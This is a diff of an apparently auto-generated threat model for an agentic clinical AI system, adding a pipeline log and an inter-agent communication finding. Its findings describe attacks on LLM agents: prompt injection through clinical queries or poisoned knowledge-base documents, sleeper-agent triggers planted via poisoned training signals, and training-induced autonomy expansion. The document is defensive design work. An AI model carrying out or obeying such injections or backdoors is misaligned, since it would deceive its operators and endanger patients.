@@ -1,14 +1,14 @@
 ---
-schema_version: "1.7"
-date: "2023-11-14"
+schema_version: "1.4"
+date: "2026-04-26"
 input_format: "mermaid"
 classification: "confidential"
-run_id: "2026-04-23T19-30-00"
+run_id: "2026-04-26T03-39-12"
 baseline:
-  source: "/Users/david/Projects/tachi/examples/agentic-app/test-output/2026-04-19T03-20-30/threats.md"
-  date: "2026-04-19"
-  finding_count: 70
-  run_id: "2026-04-19T03-20-30"
+  source: "/Users/david/Projects/tachi/examples/agentic-app/test-output/2026-04-23T19-30-00-F2-wave4/threats.md"
+  date: "2026-04-23"
+  finding_count: 83
+  run_id: "2026-04-23T19-30-00"
 coverage_gate:
   status: "pass"
   gaps: []
@@ -17,7 +17,83 @@ has_agentic_patterns: true
 has_source_attribution: true
 ---
 
-# Threat Model — Agentic AI Application (F-2 Wave 4)
+# Threat Model — Agentic AI Application (F-3 Wave 3)
+
+## Pipeline Execution Log (Intermediate)
+
+### Phase 0: Baseline Detection
+
+**Baseline detected**: `examples/agentic-app/test-output/2026-04-23T19-30-00-F2-wave4/threats.md`
+- Schema version: 1.7 (F-2 wave 4)
+- Baseline date: 2026-04-23
+- Baseline finding count: 83
+- Baseline run_id: 2026-04-23T19-30-00
+- Validation: PASSED (parseable YAML frontmatter, finding tables present)
+- Mode: **Baseline-aware**
+
+### Phase 1: Component Inventory (Intermediate)
+
+**Detected format**: Mermaid (explicit override `format: mermaid`)
+
+| Component | DFD Type | MAESTRO Layer | Description |
+|---|---|---|---|
+| User | External Entity | L7 — Agent Ecosystem | Human user submitting prompts and receiving responses via HTTPS |
+| Guardrails Service | Process | L6 — Security and Compliance | Input validation, content filtering, prompt rejection gating, and filtering event logging. Keywords: "guardrail" → L6. |
+| LLM Agent Orchestrator | Process | L1 — Foundation Model | Supervisor LLM orchestrating task delegation to Specialist Agent, Clinical Advisory Sub-Agent, and direct tool invocations via MCP Tool Server. Keywords: "LLM" → L1 (first-match). |
+| Specialist Agent | Process | Unclassified | Delegated worker agent performing specialized subtasks via Inter-Agent Communication Channel and MCP Tool Server. No L1-L6 keyword match; "agent" is L7 but component name lacks explicit L7 markers per keyword table evaluation. Defaulting to Unclassified per Phase 1 carry-forward (UNCHANGED from baseline). |
+| Inter-Agent Communication Channel | Process | Unclassified | Message routing substrate for delegation messages between Orchestrator and Specialist Agent. No L1-L6 keyword match; "channel" not in L7 keyword table. Unclassified (UNCHANGED from baseline). |
+| MCP Tool Server | Process | L3 — Agent Framework | MCP-compliant tool execution server. Keywords: "tool server" → L3. |
+| Knowledge Base | Data Store | L2 — Data Operations | Vector knowledge store for context retrieval. Keywords: "knowledge base" → L2. |
+| Audit Logger | Data Store | L5 — Evaluation and Observability | Append-only audit trail. Keywords: "audit log" → L5 (first-match, before L6). |
+| Long-Running Learning Loop | Process | Unclassified | Periodic model update pipeline. "learning loop" not in MAESTRO keyword table (token is `long_running_learning_loop` per component_type — not a MAESTRO layer keyword). Unclassified (UNCHANGED from baseline). |
+| Clinical Advisory Sub-Agent | Process | L7 — Agent Ecosystem | LLM-backed sub-agent receiving clinical queries from Orchestrator. Keywords: "sub-agent" → L7. |
+| External API | External Entity | Unclassified | Third-party external API invoked by MCP Tool Server via HTTPS. No keyword match. |
+
+**Data flow count**: 27 data flows identified.
+
+**Trust boundary summary**:
+- User Zone: Untrusted (User)
+- Application Zone: Trusted (all internal components)
+- External Services: Semi-Trusted (External API)
+
+**Self-check**: 11 components, 27 data flows — PASS.
+
+### Phase 1a: Carry-Forward (Baseline Mode)
+
+Baseline registry: 83 findings (S-1 through S-9, T-1 through T-9, R-1 through R-9, I-1 through I-9, D-1 through D-9, E-1 through E-7, AG-1 through AG-7, LLM-1 through LLM-14, OI-1 through OI-4, MI-1 through MI-3, AGP-01).
+
+Component inventory unchanged (11 components, all present). DFD types unchanged. Architecture context unchanged for all components.
+
+**Delta classification**: All 83 baseline findings → UNCHANGED. MAESTRO layers re-derived from current inventory (identical to baseline).
+
+**Coverage summary produced** (for Phase 2 isolation): all categories covered for all components.
+
+### Phase 2: Dispatch Table (Intermediate)
+
+| Component | DFD Type | MAESTRO Layer | STRIDE Categories | AI Categories | Total Agents |
+|---|---|---|---|---|---|
+| User | External Entity | L7 — Agent Ecosystem | S, R | — | 2 |
+| Guardrails Service | Process | L6 — Security and Compliance | S, T, R, I, D, E | — | 6 |
+| LLM Agent Orchestrator | Process | L1 — Foundation Model | S, T, R, I, D, E | LLM, AG | 13 |
+| Specialist Agent | Process | Unclassified | S, T, R, I, D, E | LLM, AG | 13 |
+| Inter-Agent Communication Channel | Process | Unclassified | S, T, R, I, D, E | AG | 8 |
+| MCP Tool Server | Process | L3 — Agent Framework | S, T, R, I, D, E | AG | 8 |
+| Knowledge Base | Data Store | L2 — Data Operations | T, I, D | — | 3 |
+| Audit Logger | Data Store | L5 — Evaluation and Observability | T, I, D | — | 3 |
+| Long-Running Learning Loop | Process | Unclassified | S, T, R, I, D, E | LLM, AG | 13 |
+| Clinical Advisory Sub-Agent | Process | L7 — Agent Ecosystem | S, T, R, I, D, E | LLM | 11 |
+| External API | External Entity | Unclassified | S, R | — | 2 |
+
+**Dispatch summary**:
+- Total unique agent invocations: 82
+- Components with AI dispatch: 5 (LLM Agent Orchestrator, Specialist Agent, Inter-Agent Communication Channel, MCP Tool Server, Long-Running Learning Loop, Clinical Advisory Sub-Agent)
+- Components with dual-dispatch: 3 (LLM Agent Orchestrator, Specialist Agent, Long-Running Learning Loop)
+
+**Phase 2 isolated discovery mode**: Coverage summary provided to agents; finding descriptions/scores/IDs withheld. Agents operate on full architecture context.
+
+**F-3 Wave 3 specific context**: `tool-abuse` agent dispatched to Inter-Agent Communication Channel with Category 9 (Insecure Inter-Agent Communication / A2A) pattern enrichment active. Multi-agent topology gate confirmed: Orchestrator + Specialist + ClinAdvisor delegation over Channel satisfies ≥2 agent-Process components + inter-agent data flows. Category 10 (MCP-to-MCP Trust Propagation) NOT dispatched — single MCP Tool Server topology (anti-indicator per FR-011).
+
+---
 
 ## 1. System Overview
 
@@ -121,7 +197,7 @@ has_source_attribution: true
 | S-6 | [UNCHANGED] | MCP Tool Server | L3 — Agent Framework | trust_exploitation | An attacker in the Application Zone spoofs a valid agent (Orchestrator or Specialist) to submit unauthorized tool call requests to the MCP Tool Server. Without caller authentication, any process can invoke tools with the server's external-facing credentials. | HIGH | HIGH | Critical | Enforce caller authentication on all JSON-RPC endpoints. Each agent (Orchestrator, Specialist) must present a signed caller token or mTLS certificate. The Tool Server must verify the caller's identity before executing any tool invocation. |
 | S-7 | [UNCHANGED] | Long-Running Learning Loop | Unclassified | temporal_attack | The Learning Loop accepts a Training Signal Stream from the Audit Logger without verifying the data source's integrity or authenticity. An attacker who compromises the Audit Logger can inject fabricated training signals, silently manipulating future model updates under the appearance of legitimate operational data. | HIGH | HIGH | Critical | Cryptographically sign each training signal batch at the Audit Logger before emission. The Learning Loop MUST verify the signature before ingestion. Implement provenance attestation for all training data. |
 | S-8 | [UNCHANGED] | External API | Unclassified | — | The External API provider's identity is not verified beyond TLS certificate validation. An attacker performing DNS hijacking or a BGP route hijack can redirect the MCP Tool Server's outbound API calls to an attacker-controlled server that returns malicious tool results. | MEDIUM | HIGH | High | Implement certificate pinning on outbound HTTPS connections from MCP Tool Server to External API. Verify the leaf certificate's CN/SAN against the expected provider identity. Use HSTS with a preloaded entry where available. |
-| S-9 | [NEW] | Clinical Advisory Sub-Agent | L7 — Agent Ecosystem | trust_exploitation | The Clinical Advisory Sub-Agent receives Clinical Query / Context messages from the LLM Agent Orchestrator via JSON-RPC without per-message sender attestation. A compromised or rogue Application Zone process can inject crafted clinical queries impersonating the Orchestrator, causing the sub-agent to process unauthorized requests and return manipulated clinical summaries that enter the Orchestrator's response path. | HIGH | HIGH | Critical | Authenticate all Orchestrator→ClinAdvisor JSON-RPC messages using signed caller tokens (mTLS or HMAC-signed envelope). The Clinical Advisory Sub-Agent MUST verify the caller's identity before processing any clinical query. Implement nonce/replay-prevention on every clinical query message. |
+| S-9 | [UNCHANGED] | Clinical Advisory Sub-Agent | L7 — Agent Ecosystem | trust_exploitation | The Clinical Advisory Sub-Agent receives Clinical Query / Context messages from the LLM Agent Orchestrator via JSON-RPC without per-message sender attestation. A compromised or rogue Application Zone process can inject crafted clinical queries impersonating the Orchestrator, causing the sub-agent to process unauthorized requests and return manipulated clinical summaries that enter the Orchestrator's response path. | HIGH | HIGH | Critical | Authenticate all Orchestrator→ClinAdvisor JSON-RPC messages using signed caller tokens (mTLS or HMAC-signed envelope). The Clinical Advisory Sub-Agent MUST verify the caller's identity before processing any clinical query. Implement nonce/replay-prevention on every clinical query message. |
 
 ---
 
@@ -137,7 +213,7 @@ has_source_attribution: true
 | T-6 | [UNCHANGED] | Knowledge Base | L2 — Data Operations | — | The Knowledge Base corpus can be tampered with (poisoned) by an attacker who gains write access. Injecting adversarial documents into the knowledge store causes the Orchestrator to retrieve and incorporate malicious context during vector search, corrupting the Orchestrator's responses at scale. | MEDIUM | HIGH | High | Implement write access controls on the Knowledge Base with least-privilege service accounts. Log all writes with immutable audit trails. Apply document-level integrity checks (hash + signature) at write time; verify at retrieval time. Regularly scan the corpus for adversarial content patterns. |
 | T-7 | [UNCHANGED] | Audit Logger | L5 — Evaluation and Observability | — | The Audit Logger entries can be tampered with by a process with write access to the log store. Modifying or deleting log entries corrupts the training signal stream consumed by the Long-Running Learning Loop, causing poisoned model updates, and also destroys forensic evidence needed for incident response. | MEDIUM | HIGH | High | Implement the Audit Logger as an append-only store (no update/delete operations). Cryptographically hash log batches (Merkle tree) to detect any post-write modification. Store a log hash chain externally (in a separate immutable store) that cannot be altered without detection. |
 | T-8 | [UNCHANGED] | Long-Running Learning Loop | Unclassified | temporal_attack | The training signal stream from the Audit Logger to the Learning Loop can be poisoned (data poisoning attack) by injecting adversarial entries into the Audit Logger before training runs. A time-delayed attack (temporal attack pattern) inserts adversarial training signals that activate only when a specific trigger pattern appears in future user prompts — a sleeper-agent injection via the model update cycle. | HIGH | HIGH | Critical | Apply training data provenance attestation: each log entry must carry a verifiable origin signature. Implement anomaly detection on training signal distributions to detect adversarial drift. Limit the influence of any single data source on model parameters; implement gradient clipping and differential privacy during training. |
-| T-9 | [NEW] | Clinical Advisory Sub-Agent | L7 — Agent Ecosystem | — | The Clinical Advisory Sub-Agent's context window can be tampered with via two paths: (1) adversarial documents injected into the Knowledge Base that are retrieved during vector search, populating the sub-agent's reasoning context with malicious clinical "facts"; (2) tampering with the Clinical Query / Context payload from the Orchestrator, which may embed attacker-controlled clinical framing. Either path causes the sub-agent to incorporate adversarial content into clinical summaries returned to the Orchestrator. | HIGH | HIGH | Critical | Apply document-level integrity verification on all KB retrievals by the Clinical Advisory Sub-Agent (verify document hash at retrieval time against the hash recorded at write time). Validate and sanitize Clinical Query / Context payloads received from the Orchestrator — apply the same untrusted-input treatment as delegated task messages to specialist agents. Reject query payloads containing unexpected structural elements. |
+| T-9 | [UNCHANGED] | Clinical Advisory Sub-Agent | L7 — Agent Ecosystem | — | The Clinical Advisory Sub-Agent's context window can be tampered with via two paths: (1) adversarial documents injected into the Knowledge Base that are retrieved during vector search, populating the sub-agent's reasoning context with malicious clinical "facts"; (2) tampering with the Clinical Query / Context payload from the Orchestrator, which may embed attacker-controlled clinical framing. Either path causes the sub-agent to incorporate adversarial content into clinical summaries returned to the Orchestrator. | HIGH | HIGH | Critical | Apply document-level integrity verification on all KB retrievals by the Clinical Advisory Sub-Agent (verify document hash at retrieval time against the hash recorded at write time). Validate and sanitize Clinical Query / Context payloads received from the Orchestrator — apply the same untrusted-input treatment as delegated task messages to specialist agents. Reject query payloads containing unexpected structural elements. |
 
 ---
 
@@ -153,7 +229,7 @@ has_source_attribution: true
 | R-6 | [UNCHANGED] | MCP Tool Server | L3 — Agent Framework | — | The MCP Tool Server denies having executed a specific tool invocation or received a particular JSON-RPC request. Without signed execution logs, tool invocations cannot be attributed to the requesting agent. | MEDIUM | HIGH | High | Log every JSON-RPC tool invocation to the Audit Logger before execution: the calling agent's identity (verified from the caller token), the tool name, all parameters (hashed for PII), and the resulting output (hashed). Log entries MUST be written atomically before tool execution begins. |
 | R-7 | [UNCHANGED] | Long-Running Learning Loop | Unclassified | temporal_attack | The Learning Loop denies having applied a specific model update or claims that an update was applied with different training data than what is recorded. Without cryptographic provenance, model updates cannot be attributed to specific training runs or data sources. | MEDIUM | HIGH | High | Log every model update event: training data set hash, parameter diff hash, update timestamp, and approval signature. Store model update provenance records in an immutable, externally-verifiable store. Implement model versioning with signed manifests. |
 | R-8 | [UNCHANGED] | External API | Unclassified | — | The External API provider denies having returned a specific response to the MCP Tool Server, enabling disputes over what data was received and acted upon. | LOW | MEDIUM | Low | Log all External API responses (with content hash and timestamp) in the Audit Logger immediately upon receipt. Implement request/response signing protocols with the API provider where supported (e.g., webhook signatures). |
-| R-9 | [NEW] | Clinical Advisory Sub-Agent | L7 — Agent Ecosystem | — | The Clinical Advisory Sub-Agent denies having generated a specific clinical summary or recommendation. Without non-repudiable logs of each clinical output (with content hash and the KB documents retrieved to produce it), clinical decisions influenced by sub-agent outputs cannot be attributed, and the sub-agent cannot be held accountable for hallucinated or incorrect recommendations. | MEDIUM | HIGH | High | Log every clinical output produced by the Clinical Advisory Sub-Agent to the Audit Logger with: (a) the clinical query received (content hash), (b) the KB document IDs and hashes retrieved, (c) the full clinical summary content hash, (d) a signature using the sub-agent's service key. Log the Clinical Decision Log Entry atomically before the summary is returned to the Orchestrator. |
+| R-9 | [UNCHANGED] | Clinical Advisory Sub-Agent | L7 — Agent Ecosystem | — | The Clinical Advisory Sub-Agent denies having generated a specific clinical summary or recommendation. Without non-repudiable logs of each clinical output (with content hash and the KB documents retrieved to produce it), clinical decisions influenced by sub-agent outputs cannot be attributed, and the sub-agent cannot be held accountable for hallucinated or incorrect recommendations. | MEDIUM | HIGH | High | Log every clinical output produced by the Clinical Advisory Sub-Agent to the Audit Logger with: (a) the clinical query received (content hash), (b) the KB document IDs and hashes retrieved, (c) the full clinical summary content hash, (d) a signature using the sub-agent's service key. Log the Clinical Decision Log Entry atomically before the summary is returned to the Orchestrator. |
 
 ---
 
@@ -169,7 +245,7 @@ has_source_attribution: true
 | I-6 | [UNCHANGED] | Knowledge Base | L2 — Data Operations | — | The Knowledge Base exposes its full document corpus to any process that can issue a vector search query. Without query-result access controls, a compromised Orchestrator or injected context can exfiltrate the entire corpus by issuing exhaustive search queries. | MEDIUM | HIGH | High | Implement query-result access controls: the Knowledge Base MUST enforce per-query result limits and per-session query budgets. Apply context-aware authorization to restrict retrieval to documents within the requesting session's permitted scope. Monitor for anomalous query patterns (high-volume, exhaustive retrievals). |
 | I-7 | [UNCHANGED] | Audit Logger | L5 — Evaluation and Observability | — | The Audit Logger aggregates sensitive data from all Application Zone components. Unauthorized read access to the logger (misconfigured access controls, insider threat) exposes the full operational history of the agent system, including user prompts, model decisions, tool call parameters, and filter rule triggers. | HIGH | HIGH | Critical | Enforce strict read access controls on the Audit Logger: only designated incident-response and analytics service accounts should have read access. Encrypt log entries at rest with envelope encryption (per-batch keys stored in a hardware-secured key management service). Audit all read access to the log store. |
 | I-8 | [UNCHANGED] | Long-Running Learning Loop | Unclassified | — | The Learning Loop consumes the full Audit Logger training signal stream, which includes user prompts, agent decisions, and tool call parameters. If the trained model memorizes sensitive training data, it can inadvertently reproduce PII or proprietary information in its responses (training data extraction attack). | MEDIUM | HIGH | High | Apply differential privacy techniques during training to limit per-example memorization. Implement training data de-identification: strip PII, usernames, and session identifiers from training signals before ingestion. Apply canary injection to training data to detect and alert on memorization during post-training evaluation. |
-| I-9 | [NEW] | Clinical Advisory Sub-Agent | L7 — Agent Ecosystem | — | The Clinical Advisory Sub-Agent processes clinical query context from the Orchestrator and retrieves documents from the Knowledge Base. If its Clinical Summary + Recommendations output is not scrubbed before inclusion in the Orchestrator's HTTPS response to the User, clinical context (patient-specific data, sensitive medical records, proprietary clinical protocols) can leak to unauthorized parties. Additionally, if Clinical Decision Log Entries are not field-classified before writing to the Audit Logger, sensitive clinical data propagates into the training signal stream. | HIGH | HIGH | Critical | Apply output scrubbing on all Clinical Advisory Sub-Agent outputs before the Orchestrator includes them in responses: detect and redact patient-identifying information, raw EHR document content, and proprietary clinical protocol identifiers. Apply field-level classification to Clinical Decision Log Entries — hash or tokenize sensitive clinical fields before logging. Enforce per-session scope authorization on the sub-agent's KB queries. |
+| I-9 | [UNCHANGED] | Clinical Advisory Sub-Agent | L7 — Agent Ecosystem | — | The Clinical Advisory Sub-Agent processes clinical query context from the Orchestrator and retrieves documents from the Knowledge Base. If its Clinical Summary + Recommendations output is not scrubbed before inclusion in the Orchestrator's HTTPS response to the User, clinical context (patient-specific data, sensitive medical records, proprietary clinical protocols) can leak to unauthorized parties. Additionally, if Clinical Decision Log Entries are not field-classified before writing to the Audit Logger, sensitive clinical data propagates into the training signal stream. | HIGH | HIGH | Critical | Apply output scrubbing on all Clinical Advisory Sub-Agent outputs before the Orchestrator includes them in responses: detect and redact patient-identifying information, raw EHR document content, and proprietary clinical protocol identifiers. Apply field-level classification to Clinical Decision Log Entries — hash or tokenize sensitive clinical fields before logging. Enforce per-session scope authorization on the sub-agent's KB queries. |
 
 ---
 
@@ -185,7 +261,7 @@ has_source_attribution: true
 | D-6 | [UNCHANGED] | Knowledge Base | L2 — Data Operations | — | The Knowledge Base can be rendered unavailable by an attacker who issues high-volume, complex vector search queries (exhaustive nearest-neighbor searches with high dimensionality). This degrades retrieval performance for the Orchestrator. | MEDIUM | MEDIUM | Medium | Implement per-session query rate limits and complexity bounds on vector search queries. Apply result caching for frequent queries to reduce backend load. Monitor query throughput and reject queries that exceed complexity thresholds. |
 | D-7 | [UNCHANGED] | Audit Logger | L5 — Evaluation and Observability | — | The Audit Logger can be overwhelmed by a log-flooding attack from a compromised Application Zone process, causing legitimate log entries to be dropped or the logger to become unavailable, creating audit gaps and potentially cascading to block all pipeline operations that wait for log confirmation. | MEDIUM | HIGH | High | Decouple Audit Logger writes from the critical path: use asynchronous write queues so that log submission never blocks upstream components. Implement write rate limits per source component. Apply log rotation and capacity management to prevent disk exhaustion. Alert on abnormally high write rates from any single source. |
 | D-8 | [UNCHANGED] | Long-Running Learning Loop | Unclassified | — | The Learning Loop is a resource-intensive batch process. A high-volume data injection into the Audit Logger (training signal flooding) can cause the Learning Loop to enter runaway processing, consuming excessive compute resources and either blocking legitimate model updates or degrading system performance. | MEDIUM | MEDIUM | Medium | Implement training run scheduling with resource quotas (CPU, memory, time-to-completion). Apply training data volume limits per run: cap the number of training examples ingested per scheduled run. Use separate compute pools for the Learning Loop to prevent resource contention with the real-time inference pipeline. |
-| D-9 | [NEW] | Clinical Advisory Sub-Agent | L7 — Agent Ecosystem | resource_competition | The Clinical Advisory Sub-Agent is invoked by the Orchestrator for each clinical query via JSON-RPC and performs a vector search against the Knowledge Base. High-volume or adversarially-crafted clinical queries (e.g., embedding maximally complex clinical contexts or triggering exhaustive KB retrievals) can exhaust the sub-agent's inference capacity or starve the Knowledge Base of query capacity, disrupting both clinical advisory and baseline Orchestrator retrieval operations. | MEDIUM | HIGH | High | Apply per-session and per-request token budgets on Clinical Advisory Sub-Agent invocations. Implement per-query timeout limits and KB query complexity bounds for ClinAdvisor searches. Rate-limit the Orchestrator's dispatch rate to ClinAdvisor. Monitor ClinAdvisor invocation latency and queue depth; apply backpressure to the Orchestrator when thresholds are exceeded. |
+| D-9 | [UNCHANGED] | Clinical Advisory Sub-Agent | L7 — Agent Ecosystem | resource_competition | The Clinical Advisory Sub-Agent is invoked by the Orchestrator for each clinical query via JSON-RPC and performs a vector search against the Knowledge Base. High-volume or adversarially-crafted clinical queries (e.g., embedding maximally complex clinical contexts or triggering exhaustive KB retrievals) can exhaust the sub-agent's inference capacity or starve the Knowledge Base of query capacity, disrupting both clinical advisory and baseline Orchestrator retrieval operations. | MEDIUM | HIGH | High | Apply per-session and per-request token budgets on Clinical Advisory Sub-Agent invocations. Implement per-query timeout limits and KB query complexity bounds for ClinAdvisor searches. Rate-limit the Orchestrator's dispatch rate to ClinAdvisor. Monitor ClinAdvisor invocation latency and queue depth; apply backpressure to the Orchestrator when thresholds are exceeded. |
 
 ---
 
@@ -199,7 +275,7 @@ has_source_attribution: true
 | E-4 | [UNCHANGED] | Inter-Agent Communication Channel | Unclassified | — | If the Channel does not enforce sender authentication, any Application Zone process can inject messages with forged identity headers claiming elevated sender roles (e.g., claiming to be the Orchestrator to issue trusted delegation messages). This elevates the attacker from a low-privilege process to the Orchestrator's trust level. | HIGH | HIGH | Critical | Enforce sender identity authentication at the Channel layer: all messages MUST carry a verifiable sender credential (signed token or mTLS certificate). The Channel MUST reject messages whose sender credentials cannot be verified before routing. |
 | E-5 | [UNCHANGED] | MCP Tool Server | L3 — Agent Framework | — | The MCP Tool Server executes tools with credentials it holds (service account tokens, API keys for External API). If an agent sends unauthorized tool calls (via forged identity or exploited Orchestrator), it gains the Tool Server's execution privileges — invoking external APIs, writing to external systems, and accessing data sources with the server's full credential set. | HIGH | HIGH | Critical | Implement zero-trust authorization at the Tool Server: each tool invocation MUST be authorized against the originating session's scope, independent of the caller's identity. Apply the principle of least-privilege for tool execution: tool-specific service accounts with minimum necessary external permissions. Rotate API credentials regularly. |
 | E-6 | [UNCHANGED] | Long-Running Learning Loop | Unclassified | temporal_attack | The Learning Loop applies model updates with access to the Orchestrator, Specialist Agent, and Clinical Advisory Sub-Agent model parameters. If the update mechanism is compromised (poisoned training data, unauthenticated update channel), an attacker elevates from data-layer access to model-parameter control, effectively gaining the ability to inject arbitrary behaviors into all three agents via the next update cycle. | HIGH | HIGH | Critical | Authenticate and authorize all model update pushes: the Learning Loop MUST sign each model update package with an HSM-backed key. The Orchestrator, Specialist, and ClinAdvisor MUST verify the update signature before applying. Implement a staged rollout with A/B testing and behavioral regression checks before production deployment of any model update. |
-| E-7 | [NEW] | Clinical Advisory Sub-Agent | L7 — Agent Ecosystem | trust_exploitation | The Clinical Advisory Sub-Agent operates with access to the Knowledge Base and produces clinical outputs that feed directly into the Orchestrator's response path. A prompt injection attack embedded in the Clinical Query / Context payload (or via adversarial KB documents retrieved during context assembly) can cause the sub-agent to self-authorize elevated access: issuing requests for documents outside the session's clinical scope, fabricating clinical authority beyond the sub-agent's intended advisory role, or returning outputs designed to manipulate the Orchestrator into taking high-privilege actions (such as invoking high-risk tools). | HIGH | HIGH | Critical | Enforce per-session KB access scoping for the Clinical Advisory Sub-Agent: the sub-agent MUST only retrieve documents within the session's authorized clinical scope. Treat the sub-agent's outputs as untrusted at the Orchestrator — apply a clinical-output validator before incorporating them into tool invocation decisions or user-facing responses. Implement instruction-boundary enforcement on the ClinAdvisor's system prompt inaccessible to clinical query content. |
+| E-7 | [UNCHANGED] | Clinical Advisory Sub-Agent | L7 — Agent Ecosystem | trust_exploitation | The Clinical Advisory Sub-Agent operates with access to the Knowledge Base and produces clinical outputs that feed directly into the Orchestrator's response path. A prompt injection attack embedded in the Clinical Query / Context payload (or via adversarial KB documents retrieved during context assembly) can cause the sub-agent to self-authorize elevated access: issuing requests for documents outside the session's clinical scope, fabricating clinical authority beyond the sub-agent's intended advisory role, or returning outputs designed to manipulate the Orchestrator into taking high-privilege actions (such as invoking high-risk tools). | HIGH | HIGH | Critical | Enforce per-session KB access scoping for the Clinical Advisory Sub-Agent: the sub-agent MUST only retrieve documents within the session's authorized clinical scope. Treat the sub-agent's outputs as untrusted at the Orchestrator — apply a clinical-output validator before incorporating them into tool invocation decisions or user-facing responses. Implement instruction-boundary enforcement on the ClinAdvisor's system prompt inaccessible to clinical query content. |
 
 ---
 
@@ -216,6 +292,7 @@ has_source_attribution: true
 | AG-5 | [UNCHANGED] | MCP Tool Server | L3 — Agent Framework | trust_exploitation | The MCP Tool Server is vulnerable to tool call injection: an attacker who can influence the LLM output of either the Orchestrator or Specialist Agent can inject crafted JSON-RPC parameters that invoke unintended tools (tool name injection) or supply malicious arguments to permitted tools (parameter injection). The Tool Server executes these with its own service credentials. | MCP-03 | HIGH | HIGH | Critical | Implement strict tool call validation: (a) validate the tool name against a registered allowlist, (b) validate each parameter against a per-tool JSON Schema, (c) reject any request that fails validation before execution. Apply parameter encoding for values that will be forwarded to external systems (URLs, SQL fragments, shell arguments). |
 | AG-6 | [UNCHANGED] | MCP Tool Server | L3 — Agent Framework | resource_competition | The MCP Tool Server acts as a privileged execution broker. Runaway or adversarially prompted agents (Orchestrator or Specialist) can cause the Tool Server to repeatedly call External API endpoints in rapid succession, exhausting the API provider's rate limits, incurring financial costs, or triggering security lockouts that deny the system access to required external capabilities. | MCP-03 | MEDIUM | HIGH | High | Implement per-session and per-agent tool call budgets with hard rate limits enforced at the Tool Server (not just the agent). Apply per-tool circuit breakers: if a tool's error rate exceeds a threshold, temporarily disable it and alert operators. Monitor cumulative external API spend and alert on anomalous patterns. |
 | AG-7 | [UNCHANGED] | Long-Running Learning Loop | Unclassified | temporal_attack | The Learning Loop's model update mechanism, when fed adversarially crafted training signals, can be exploited for a temporal autonomy attack: the training data contains instructions that cause the updated model to expand its autonomous action scope on the next cycle, gradually accumulating capabilities it was not originally authorized to have. | ASI-01 | HIGH | HIGH | Critical | Apply capability auditing as part of every model update evaluation: before deploying an update, run the updated model through a capability regression suite that tests for unauthorized capability expansion. Enforce a strict capability allowlist (permitted tool types, action categories) that is evaluated post-update and MUST pass before production deployment of any model update. |
+| AG-8 | [NEW] | Inter-Agent Communication Channel | Unclassified | communication_vulnerability | **Insecure Inter-Agent Communication (Category 9 — OWASP ASI07:2026)**: The Inter-Agent Communication Channel connects the LLM Agent Orchestrator, Specialist Agent, and (via the Orchestrator) the Clinical Advisory Sub-Agent without declaring mutual authentication, inter-agent message signing, or nonce-based replay prevention. The channel does not declare mTLS between senders and receivers, messages lack HMAC envelope signatures or asymmetric envelope signatures (Ed25519 / ECDSA), and no timestamp-bound nonce-based replay-window enforcement is documented. A network-positioned attacker or a compromised Application Zone process can intercept delegation messages (AML.T0060 agent-in-the-middle topology) and replay, modify, or inject instructions to the Specialist Agent or the Orchestrator without any authentic-source signal available to the receiving component. The Orchestrator additionally acts as a relay between the Channel and the Clinical Advisory Sub-Agent without declared taint propagation — the relay's outputs do not carry the upstream sender's authority labels, enabling an attacker who compromises the Orchestrator's relay function to propagate attacker-controlled content to ClinAdvisor without the authority label that ClinAdvisor would need to detect tampering. | ASI-07 | HIGH | HIGH | Critical | (1) Mutual TLS (mTLS) — pinned client/server certificates with mutual verification on every inter-agent channel endpoint; reject any channel without declared mTLS at trust-boundary crossings. (2) Inter-agent message signing — HMAC envelope signing (HMAC-SHA256) or asymmetric envelope signature (Ed25519) with integrity verification at the receiving agent BEFORE any action is taken on the message. (3) Nonce-based replay prevention — bounded message-age window enforced with a monotonic counter or timestamp + per-call nonce; receiving agents MUST reject messages outside the replay window. (4) Inter-agent taint labels — authority propagation across the Orchestrator relay: the relay's outputs MUST carry the upstream sender's authority labels so ClinAdvisor and Specialist can detect tampering at the receiving end. (5) Per-channel mutual authentication fallback — mutual JWT or mutual API key as fallback where mTLS is infeasible, validated peer-to-peer at every channel handshake. |
 
 ---
 
@@ -235,8 +312,8 @@ has_source_attribution: true
 | LLM-10 | [UNCHANGED] | Specialist Agent | Unclassified | — | Improper output handling — server-side injection via tool call results: the Specialist Agent's tool call results from MCP Tool Server are incorporated into its context and may influence downstream tool invocations. If the Tool Server returns LLM-influenced content that contains injection payloads, the Specialist's next tool call may forward those payloads to execution sinks. Execution context is **server-side**. | OWASP LLM05:2025 | MEDIUM | HIGH | High | Implement output sanitization on all tool results before incorporating them into the Specialist's context window for subsequent tool invocations. Treat tool results as untrusted data inputs — never interpolate them directly into subsequent tool call parameters without validation. Apply allowlist-based parameter validation at the Tool Server for all tool inputs regardless of source. |
 | LLM-11 | [UNCHANGED] | Long-Running Learning Loop | Unclassified | temporal_attack | Data poisoning of the Learning Loop's training signal: the audit log training stream is the Learning Loop's primary data source. An attacker who systematically injects adversarially crafted interaction records into the Audit Logger creates poisoned training data that shifts the updated models' behavior over the training cycle — a temporal data poisoning attack with delayed activation at the next model update. | OWASP LLM03:2025 | HIGH | HIGH | Critical | Implement training data integrity controls: (a) cryptographic signing of each audit log batch, (b) anomaly detection on training signal distributions (outlier detection, behavioral drift analysis), (c) holdout evaluation before deploying any update, (d) differential privacy during training to limit per-example influence. Apply a human-review gate on model updates that show significant behavioral deviation from the prior version. |
 | LLM-12 | [UNCHANGED] | Long-Running Learning Loop | Unclassified | temporal_attack | Model theft via Learning Loop output monitoring: an attacker with observability access to the Learning Loop's model update artifacts (parameter diffs, update packages) can reconstruct the model's architecture, parameters, or training data characteristics — effectively stealing the proprietary model. | OWASP LLM10:2025 | MEDIUM | HIGH | High | Encrypt model update packages end-to-end: the Learning Loop MUST encrypt model artifacts before emission; the Orchestrator and Specialist decrypt using HSM-managed keys. Apply model watermarking to enable theft detection. Restrict access to model update artifacts to authorized deployment services only. |
